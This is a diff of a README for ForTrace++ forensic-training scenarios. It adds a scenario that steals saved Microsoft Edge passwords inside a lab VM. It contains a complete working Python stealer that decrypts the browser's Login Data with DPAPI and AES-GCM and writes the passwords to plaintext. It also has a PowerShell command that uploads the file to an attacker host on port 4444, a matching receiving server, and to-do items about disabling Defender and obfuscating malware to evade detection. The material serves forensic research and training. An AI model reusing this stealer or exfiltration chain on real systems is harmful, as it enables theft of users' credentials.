@@ -11,7 +11,7 @@
   - [Preparing the Windows VM for the Scenarios](#preparing-the-windows-vm-for-the-scenarios)
 - [Scenarios](#scenarios)
   - [Scenario 1: Easy – Unauthorized Remote Access via Backdoor](#scenario-1-easy--unauthorized-remote-access-via-backdoor)
-  - [Scenario 2: Medium – Simulation of Secure Malware / Ransomware-like Behavior](#scenario-2-medium--simulation-of-secure-malware--ransomware-like-behavior)
+  - [Scenario 2: Medium – Exfiltrate Passwords from the local Database of the Webbrowser](#scenario-2-medium--exfiltrate-passwords-from-the-local-database-of-the-webbrowser)
   - [Scenario 3: Hard - File Encryption (Ransomware-like Behavior)](#scenario-3-hard---file-encryption-ransomware-like-behavior)
 - [Expected Artifacts and Analysis](#expected-artifacts-and-analysis)
 - [Summary and Conclusion](#summary-and-conclusion)
@@ -650,9 +650,259 @@ backdoor:
 > **(Optional)**: Observe the automation process through virt-manager as it interacts with the VM. 
 ---
 
-### Scenario 2: Medium – Exfiltrate Passwords from the SQLite Database of the Webbrowser
+### Scenario 2: Medium – Exfiltrate Passwords from the local Database of the Webbrowser
 
+#### **Description**
+This scenario demonstrates how **saved passwords** in a web browser can be extracted and exfiltrated if an attacker gains access to a system. Many users store passwords directly in their browsers for convenience without using **secure password managers**. This scenario builds upon **Scenario 1**, where an unattended machine was compromised, allowing an attacker to execute a script that retrieves stored credentials.
 
+The extracted credentials are then **saved locally** and can be **uploaded to an attacker's web server** for further use.
+
+---
+
+### **Real-World Attack Scenario**
+1. **User Behavior Leading to Vulnerability**
+   - A user frequently logs into **PayPal, Reddit, and X (Twitter)** and **chooses to save passwords** in Microsoft Edge for convenience.
+   - The user **does not use an external password manager** and relies solely on the browser's built-in password storage.
+
+2. **Compromise of the System**
+   - The user **leaves their Windows 10 machine unattended** (as demonstrated in **Scenario 1**).
+   - An attacker gains access to the system and **executes a password extraction script** that retrieves saved credentials.
+
+3. **Password Extraction and Exfiltration**
+   - The script accesses the **SQLite database storing passwords** in Microsoft Edge.
+   - It decrypts stored credentials and **saves them in a text file**.
+   - The credentials are then **uploaded to a remote web server** controlled by the attacker.
+
+---
+
+## **Overview**
+
+### **Environment**
+- A **Windows 10 virtual machine (VM)** with a **pre-installed web browser** (Microsoft Edge).
+- A **local network connection** allowing exfiltration of credentials to an attacker's machine.
+
+### **Execution**
+1. **System Preparation:**
+   - Install Python and necessary packages.
+   - Download and prepare the extraction script.
+   - Populate the Microsoft Edge browser with credentials for some websites or online-services
+
+2. **Attack Execution:**
+   - The script extracts **saved passwords from the Edge browser SQLite database**.
+   - The extracted credentials are stored in a **text file**.
+   - The credentials are **uploaded to a remote web server** controlled by the attacker.
+
+3. **Logging & Artifacts:**
+   - Log files documenting the extraction process.
+   - The **stolen credentials stored in plaintext**.
+   - **Network traces** of the password exfiltration.
+
+---
+
+## **Technical Implementation**
+
+### **Prerequisites – Windows VM Preparation**
+Before executing the scenario, the **VM must be prepared** with the required tools.
+
+1. **Install Python (if not already installed)**
+   ```powershell
+   winget install -e --id Python.Python.3.11
+   ```
+2. **Install Required Python Packages**
+   ```powershell
+   pip install pypiwin32
+   pip install pycryptodomex
+   ```
+
+---
+
+### **Password Extraction from Edge**
+#### **Step 1: Locate the Edge Password Database**
+Microsoft Edge (Chromium-based) **stores saved passwords in an SQLite database** located at:
+```plaintext
+C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
+```
+This database contains **encrypted** passwords, which require **AES decryption** using the Windows DPAPI (Data Protection API).
+> **Source**: [Microsoft Edge password manager security | Microsoft Learn](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-security-password-manager-security) 
+
+#### **Step 2: Extract and Decrypt Saved Credentials**
+The following Python script `edge_password_extractor.py` **extracts** and **decrypts** stored passwords:
+
+```python
+import os
+import json
+import base64
+import sqlite3
+import shutil
+import win32crypt
+from Cryptodome.Cipher import AES
+
+# Define Edge file paths
+EDGE_PATH = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data")
+LOGIN_DB_PATH = os.path.join(EDGE_PATH, "Default", "Login Data")
+LOCAL_STATE_PATH = os.path.join(EDGE_PATH, "Local State")
+TEMP_DB_PATH = os.path.join(os.environ["TEMP"], "Edge_LoginData.db")
+
+# Extract AES key from Local State
+def get_aes_key():
+    with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+# Decrypt AES-encrypted passwords
+def decrypt_password(encrypted_password, aes_key):
+    iv = encrypted_password[3:15]
+    encrypted_data = encrypted_password[15:-16]
+    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
+    return cipher.decrypt(encrypted_data).decode()
+
+# Extract saved passwords
+def extract_edge_passwords():
+    shutil.copyfile(LOGIN_DB_PATH, TEMP_DB_PATH)  # Avoid file lock issues
+    aes_key = get_aes_key()
+
+    conn = sqlite3.connect(TEMP_DB_PATH)
+    cursor = conn.cursor()
+
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    with open("extracted_passwords.txt", "w") as file:
+        for row in cursor.fetchall():
+            url, username, encrypted_password = row
+            decrypted_password = decrypt_password(encrypted_password, aes_key)
+            file.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
+
+    conn.close()
+    os.remove(TEMP_DB_PATH)
+
+extract_edge_passwords()
+```
+
+📌 **Explanation:**
+- **Copies the database** before accessing it to prevent file locks.
+- **Extracts the AES decryption key** from the `"Local State"` file.
+- **Decrypts saved passwords** using **AES-GCM**.
+- **Stores the credentials in a plaintext file (`extracted_passwords.txt`)**.
+
+---
+
+### **Exfiltrating Stolen Credentials to an Attacker's Server**
+The extracted passwords can be **automatically uploaded** using PowerShell:
+
+```powershell
+Invoke-WebRequest -Uri "http://192.168.122.1:4444/upload" -Method POST -InFile "C:\Users\fortrace\Desktop\extracted_passwords.txt" -UseBasicParsing
+```
+
+> **Note:** Use the Port 4444 since it should be already prepared to be open from scenario1
+
+![](pictures/password_upload.png)
+
+📌 **Notes:**
+- The attacker's machine should be **running a web server** to receive the file.
+- This can be done using the following Python script `http_upload_server.py` that **runs a simple custom HTTP server** accepting file uploads over port **4444**.
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class FileUploadHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        """Handle raw file uploads via HTTP POST"""
+        file_length = int(self.headers['Content-Length'])
+        filename = "uploaded_passwords.txt"  # Save all uploads as this file
+
+        with open(filename, "wb") as output_file:
+            output_file.write(self.rfile.read(file_length))
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(f"File {filename} uploaded successfully!".encode())
+
+if __name__ == "__main__":
+    server_address = ("", 4444)  # Listen on port 4444
+    httpd = HTTPServer(server_address, FileUploadHandler)
+    print("Server listening on port 4444...")
+    httpd.serve_forever()
+```
+
+```sh
+python http_upload_server.py
+```
+
+## **Using the ForTrace++ Scenario**
+
+### **Folder Structure**
+Ensure your ForTrace++ installation follows this structure:
+
+```
+fortrace/
+  ├── scenarios/
+  │    ├── scenario1-backdoor/
+  │    ├── scenario2-password_exfiltration/
+  │    │   ├── edge_password_extractor.py
+  │    │   ├── http_upload_server.py
+  │    │   ├── scenario_2_browsing.txt
+  │    │   ├── scenario2.py
+  │    │   ├── scenario2.yaml
+  │    │   └── uploaded_passwords.txt
+  └── .venv/
+```
+
+### **Step 1: Start the Python HTTP Server on the Attacker Machine**
+Before executing the scenario, **host the scripts on a local web server** to allow Windows to download them automatically:
+
+```sh
+cd ~/fortrace/scenarios/scenario2-password_exfiltration
+python -m http.server 8080
+```
+
+---
+
+### **Step 2: Run the Scenario in ForTrace++**
+1. **Activate the virtual environment**:
+   ```sh
+   source .venv/bin/activate
+   ```
+2. **Start the Windows VM scenario**:
+   ```sh
+   python scenarios/scenario2-password_exfiltration/scenario2.py
+   ```
+3. **Monitor execution via virt-manager**.
+
+---
+
+### **Step 3: Start the File Upload Server on the Attacker Machine**
+To **receive the stolen passwords**, start an HTTP server that accepts file uploads:
+
+```sh
+python scenarios/scenario2-password_exfiltration/http_upload_server.py
+```
+📌 The server listens on **port 4444** for file uploads.
+
+---
+
+## **Outlook & Future Improvements**
+### **Automating the Entire Process with ForTrace++**
+- Instead of manually **preparing saved credentials** on the VM, ForTrace++ can:
+  - **Automate logging into websites** and selecting "Save Password."
+  - **Use text recognition** to detect and confirm "Save Password" dialogs.
+  - **Transmit mouse and keyboard inputs** to Edge using `perform_complex_action()`.
+
+### **Reduce the VM preparation steps**
+- Instead of installing python and the needed packages it's also possible to create `.exe` of the Script.
+  - This is demonstrated in the following scenario 3!
+
+### **Use Firefox (as an Alternative Attack Vector)**
+[How Firefox securely saves passwords | Mozilla Support](https://support.mozilla.org/en-US/kb/how-firefox-securely-saves-passwords)
+
+[GitHub - unode/firefox_decrypt: Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles](https://github.com/unode/firefox_decrypt?tab=readme-ov-file#non-interactive-mode)
+-  ```powershell
+   winget install -e --id Mozilla.Firefox
+   ```
+
+- Download the Firefox Password Decryption Script
+   ```powershell
+   Invoke-WebRequest -Uri "https://github.com/firefox-decrypt/firefox_decrypt.py" -OutFile "C:\Users\fortrace\Documents\firefox_decrypt.py"
+   ```
 
 ---
 
@@ -776,11 +1026,6 @@ vectors while producing forensic artifacts that are valuable for research and fo
 
 These scenarios provide both a practical insight into common attack vectors and valuable case studies for forensic analysis. The combination of YAML configuration and Python automation with ForTrace++ ensures a repeatable and controlled workflow—ideal for training and research purposes.
 
-**Outlook:**
-- Further development of automation scripts to simulate even more realistic attack scenarios.
-- Incorporate additional steps into the scenario, such as using an email client to receive an email containing a Word document with a malicious macro.
-- Evaluation and comparison of results with real-world attack data.
-
 ### Evaluation and Usability of ForTrace++
 
 ForTrace++ has proven to be a powerful framework for simulating complex attack scenarios in a controlled virtual machine environment. The following points summarize the evaluation and usability aspects:
@@ -841,11 +1086,13 @@ Traceback (most recent call last):
 ValueError: max() iterable argument is empty
 ```
 
-## Potential Improvements (To-Do)
+## Potential Improvements (To-Do) - Outlook
 - modify the unattend.xml to automatically execute the PowerShell scripts
   - allow the PowerShell Execution Policy
   - automatic Install of the Windows SPICE Guest Tools
   - deactivate Windows Defender already in the ISO, so the Malware Examples work without interruption
 - Development of Malware that is not already detected by Windows Defender by using obfuscation techniques.
-
+- Further development of automation scripts to simulate even more realistic attack scenarios.
+- Incorporate additional steps into the scenario, such as using an email client to receive an email containing a Word document with a malicious macro.
+- Evaluation and comparison of results with real-world attack data.
 ---
